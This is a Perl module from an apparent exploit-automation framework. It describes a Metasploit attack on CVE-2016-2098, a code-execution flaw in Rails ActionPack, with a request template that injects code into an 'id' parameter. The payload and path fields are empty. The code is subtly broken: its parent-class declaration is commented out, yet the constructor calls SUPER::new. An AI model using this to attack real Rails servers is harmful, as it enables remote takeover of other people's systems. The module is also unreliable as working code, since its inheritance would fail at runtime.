package MSFExploits::Exploits::RAILS::MSF::RailsActionpackInlineExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::RAILS);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "RailsActionpackInlineExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2016-2098",
  DESCRIPTION => "

          This module exploits a remote code execution vulnerability in the

        inline request processor of the Ruby on Rails ActionPack component.

        This vulnerability allows an attacker to process ERB to the inline

        JSON processor, which is then rendered, permitting full RCE within

        the runtime, without logging an error condition.

      ",
  MSF_MODULE => "rails_actionpack_inline_exec",
  TITLE => "Ruby on Rails ActionPack Inline ERB Code Execution",
  VARIABLES => {
    'TARGETPARAM' =>       {
  DESCRIPTION => "The target parameter to inject with inline code",
  VALUE => "id",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/json',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
